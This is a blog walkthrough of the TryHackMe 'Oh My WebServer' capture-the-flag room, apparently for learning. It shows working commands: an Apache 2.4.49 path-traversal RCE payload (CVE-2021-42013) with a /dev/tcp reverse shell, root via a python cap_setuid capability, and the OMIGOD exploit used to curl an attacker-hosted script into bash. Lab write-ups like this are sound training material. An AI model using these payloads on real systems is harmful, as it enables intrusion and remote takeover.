---
title: "Oh My WebServer machine"
date: 2022-03-25 00:10:10 +0530
categories: [Tryhackme, Linux Machines]
tags: [tryhackme, ctf, nmap, masscan, vhost, ffuf]
image: /assets/img/ohmywebserver/machine.png
---

# Introduction
 
 Oh My WebServer is room  made by big man [tinyb0y](https://twitter.com/t1nyb0y) on TryHackMe. It can be [found here](https://tryhackme.com/room/ohmyweb)
 <figure>
<img src="/assets/img/ohmywebserver/machine.png" alt="machine">
<figcaption></figcaption>
</figure>
<br>
 Here is write up on how i successfully compromised and obtainned user and root flags

### Methodolgy
1. Nmap scan
2. Getting user reverse shell 
3. Getting root reverse shell

#### Nmap scan on the target host
 
```console

└─$ nmap -A -vv -Pn --open -oN nmap.txt 10.10.214.39
# Nmap 7.92 scan initiated Tue Mar  8 19:19:00 2022 as: 
Nmap scan report for 10.10.214.39
Host is up, received user-set (0.68s latency).
Scanned at 2022-03-08 19:19:00 EAT for 65s
Not shown: 998 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMlfGBGWZkPg98VnvD+FVeesHsQwmtoJfMOMhifMjxD9AEluFQNVnoyxyQi5y9O2/AN/MO+l57li33lHiVjD1eglBjB3Lkzz3tpRJSmGn2Ug3jRypShkSJ9VkUVFElw8MXke62w3+9pi+S0Ub1DqcttGH8TqihiWvqJbJYnecqjdcka1uKPdPna0gleow9JiaAH3X4EMFdcXZDOGgnOaZId2mEXFDeNNYFZpS+EOcLgXaAp1NobUckE9NXvE73qw+pBNo69m3z4MG7/cJNIsQiFpm5yqgCKJGjhwGFp4zAMXOD23lj1g+iQlwrchwY5nBEHHae1PjQwLjwuWebjWR+bWPalPVYa4d8+15TjjgV8VW/Rac3rTX+A/buyVxUSMhkBtn7fQ2sLoMPPn7vRDo3ggGl5IZaYIvSYRDk9nadsZk+YKUCSgFf97z0PK278vbrPwjJTyyScAnjvs+oLnD/bAdja4uwOOS2CHehjzipVmWf7zR3srIfjZQ4aAUmeh8=
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLf6FvNwGNtpra24lyJ4YWPqB8olwPXhKdr6gSW6Dc+oXdZJbQPtpD7cph3nvR9sQQnTKGiG69XyGKh0ervYI1U=
|   256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEzBDIQu+cp4gApnTbTbtmqljyAcr/Za8goiY57VM+uq
80/tcp open  http    syn-ack Apache httpd 2.4.49 ((Unix))
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  8 19:20:05 2022 -- 1 IP address (1 host up) scanned in 65.22 seconds
```
<br>
- [x] output

<div class="overflow-table" markdown="block">

| PORT STATE         | SERVICE VERSION                            |   
| :------------------| :--------------------------------- | 
|  22/tcp open       |  OpenSSH 8.2p1 Ubuntu 4ubuntu0.3   |
|  80/tcp open       |  Apache httpd 2.4.49 ((Unix))       |      
     
</div>
<br>
- Trying lower hanging fruit vulnerabilities (Service version vulnerabilities). After research, The version of web server is vulnerable to `CVE-2021-42013`. Check from [this blog](https://blogs.juniper.net/en-us/threat-research/apache-http-server-cve-2021-42013-and-cve-2021-41773-exploited).

#### Getting user reverse shell 

### Getting reverse shell

- [x] From the blog  exploit is like

```console
└─$ curl "http://10.10.214.39/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" --data 'echo Content-Type: text/plain; echo; bash -c "exec bash -i &>/dev/tcp/10.4.54.226/4444 <&1"'
```
<br>
- [x] got shell as user `daemon`

```console
└─$ nc -nlvp 4444          
Listening on 0.0.0.0 4444
Connection received on 10.10.214.136 35818
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@4a70924bafa0:/bin$ whoami
whoami
daemon
daemon@4a70924bafa0:/bin$ 

daemon@4a70924bafa0:/bin$ 
```
<br>
- [x] After uploading linpeas  in target machine and executing in target machine, We can see there is python capability in `Capabilities` linpeas outputs

```console
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                                    
Current capabilities:                                                                                                                                                         
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
CapInh: 00000000a80425fb
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 00000000a80425fb
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/python3.7 = cap_setuid+ep
```
Or you can use 

```bash
daemon@4a70924bafa0:/tmp# getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/tmp# 
daemon@4a70924bafa0:/tmp# 
daemon@4a70924bafa0:/tmp# 
```
<br>
- [x] After some googling found a nice site  which have well explained about linux capabilities, 
[check it here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities).\
From the blog now you can be root inside docker by running the following and getting user.txt flag

```console
daemon@4a70924bafa0:/bin$ /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
root@4a70924bafa0:/bin# id
uid=0(root) gid=1(daemon) groups=1(daemon)
root@4a70924bafa0:/bin# su root
root@4a70924bafa0:/bin# cd ~
root@4a70924bafa0:~# ls
user.txt
root@4a70924bafa0:~# ls -la
total 28
drwx------ 1 root root   4096 Oct  8 08:28 .
drwxr-xr-x 1 root root   4096 Feb 23 06:21 ..
lrwxrwxrwx 1 root root      9 Oct  8 05:43 .bash_history -> /dev/null
-rw-r--r-- 1 root root    570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root   4096 Oct  8 05:37 .cache
-rw-r--r-- 1 root root    148 Aug 17  2015 .profile
-rw------- 1 root daemon   12 Oct  8 08:28 .python_history
-rw-r--r-- 1 root root     38 Oct  8 05:47 user.txt
root@4a70924bafa0:~# cat user.txt 
   THM{REDACTED}
root@4a70924bafa0:~#
```

#### Getting root reverse shell and flag

- [x] Run ifconfig 
- To see if there is other hosts attached to this machine because it is docker, So am finding any other hosts in this dockers network

```console
root@4a70924bafa0:/tmp# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 3181  bytes 904486 (883.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2154  bytes 2869534 (2.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2  bytes 100 (100.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 100 (100.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
<br>
 - Now we can see there is `172.17.0.2` so lets identify other hosts. There is  no nmap in the machine. Let's download a static nmap binary to our machine and then download it in the target machine from our machine\
Yoc can download it from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)

<br>

- [x] started local python server in my machine as

```console
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.18.142 - - [08/Mar/2022 21:52:55] "GET /nmap HTTP/1.1" 200 -
```
<br>
- [x] And in the target machine there was curl program installed just go to `/tmp/` dir in target docker machine and download nmap binary from your machine and executable permissiom

```console
root@4a70924bafa0:/tmp# curl http://<your machineip>:8000/nmap -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0   197k      0  0:00:29  0:00:29 --:--:--  292k
root@4a70924bafa0:/tmp# ls
nmap
root@4a70924bafa0:/tmp# chmod +x nmap
```
<br>
- [x] scanning the whole network for any available host, In case you  need more about nmap check 
   [my blog post here](https://peterchain7.github.io/nmap/)

```console
root@4a70924bafa0:/tmp# ./nmap -p- 172.17.0.* -vv -Pn
```
<br>
- [x] At the bottom of nmap output one host is identified as up and running some services

```console
Nmap scan report for 172.17.0.255 [host down, received no-response]
Initiating SYN Stealth Scan at 17:03
Scanning ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1) [65535 ports]
Discovered open port 80/tcp on 172.17.0.1
Discovered open port 22/tcp on 172.17.0.1
Increasing send delay for 172.17.0.1 from 0 to 5 due to 11 out of 30 dropped probes since last increase.
```
<br>
- [x] so let dig into this identified host with nmap

```console
root@4a70924bafa0:/tmp# ./nmap -p- 172.17.0.1 -vv -Pn --min-rate 5000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-03-08 17:05 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Initiating ARP Ping Scan at 17:05
Scanning 172.17.0.1 [1 port]
Completed ARP Ping Scan at 17:05, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:05
Completed Parallel DNS resolution of 1 host. at 17:05, 0.00s elapsed
Initiating SYN Stealth Scan at 17:05
Scanning ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1) [65535 ports]
Discovered open port 80/tcp on 172.17.0.1
Discovered open port 22/tcp on 172.17.0.1
Discovered open port 5986/tcp on 172.17.0.1
Increasing send delay for 172.17.0.1 from 0 to 5 due to 11 out of 36 dropped probes since last increase.
Completed SYN Stealth Scan at 17:06, 39.55s elapsed (65535 total ports)
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up, received arp-response (-0.0019s latency).
Scanned at 2022-03-08 17:05:53 UTC for 40s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT     STATE  SERVICE REASON
22/tcp   open   ssh     syn-ack ttl 64
80/tcp   open   http    syn-ack ttl 64
5985/tcp closed unknown reset ttl 64
5986/tcp open   unknown syn-ack ttl 64
MAC Address: 02:42:9D:37:F1:91 (Unknown)

Read data files from: /etc
Nmap done: 1 IP address (1 host up) scanned in 39.77 seconds
           Raw packets sent: 196630 (8.652MB) | Rcvd: 36 (1.476KB)
```
<br>
- [x] After some research on every port opened in this host.

---
 since we have just run static nmap can not give us more information about services running in target host. *Found 5985,5986 - Pentesting OMI* in [hacktrickz here](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-omi). as interesting
 
  From a blog there is `CVE-2021-38647` Let's check if it is still vulnerable. exploit can be found [here](https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/main/omigod.py)


### Steps to exploit this vulnerability

- [x] Download exploit above in your local machine and start python server in current directory

```bash
└─$ python3 -m http.server 8000                                                        
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..
```
<br>
- [x] In the target  machine in `/tmp/` dir download exploit using curl and give executable permission

```bash
root@4a70924bafa0:/tmp# curl 10.4.54.226:8000/omigod.py -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2720  100  2720    0     0   2020      0  0:00:01  0:00:01 --:--:--  2019
root@4a70924bafa0:/tmp# chmod +x omigod.py 
```

<br>
- [x] run commands  in remote machine `172.17.0.1` using exploit syntax as shown in download page.

Example 
```bash
root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1  -c id
uid=0(root) gid=0(root) groups=0(root)
root@4a70924bafa0:/tmp# 
root@4a70924bafa0:/tmp# 
```
Or
To get remote shell in you machine by forcing the target `172.17.0.1` to download exploit from you machine containing rev shell payload and execute it

```bash
root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1  -c bash -c 'curl 10.4.54.226:8000/omi.sh |bash'
```
Contents of `omi.sh` maybe. ``bash -c 'exec bash -i &>/dev/tcp/10.4.54.216/1234 <&1'``

And you have shell in your netcat listener and boom!! There we got root flag

```console
└─$ nc -nlvp 1234                 
Listening on 0.0.0.0 1234
Connection received on 10.10.214.136 37914
bash: cannot set terminal process group (1868): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/var/opt/microsoft/scx/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/var/opt/microsoft/scx/tmp# cd /root/
cd /root/
root@ubuntu:/root# ls -la
ls -la
total 56
drwx------  5 root root  4096 Feb 23 05:20 .
drwxr-xr-x 20 root root  4096 Sep 30 05:05 ..
-rw-------  1 root root   169 Oct  8 08:24 .bash_history
-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root  4096 Feb 23 05:20 .local
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
-rw-------  1 root root  1024 Sep 30 05:53 .rnd
drwx------  2 root root  4096 Sep 30 05:19 .ssh
-rw-------  1 root root 12125 Oct  8 05:05 .viminfo
-rw-r--r--  1 root root   277 Oct  8 04:33 .wget-hsts
-rw-r--r--  1 root root    38 Oct  8 05:48 root.txt
drwxr-xr-x  3 root root  4096 Sep 30 05:20 snap
root@ubuntu:/root# cat root.txt 
cat root.txt
THM{REDACTED}
root@ubuntu:/root#
```
Congrats to [tinyb0y](https://twitter.com/t1nyb0y) 
 <figure>
<img src="/assets/img/ohmywebserver/finished-finally-finished.gif" alt="finished-finally-finished">
<figcaption></figcaption>
</figure>

<br>

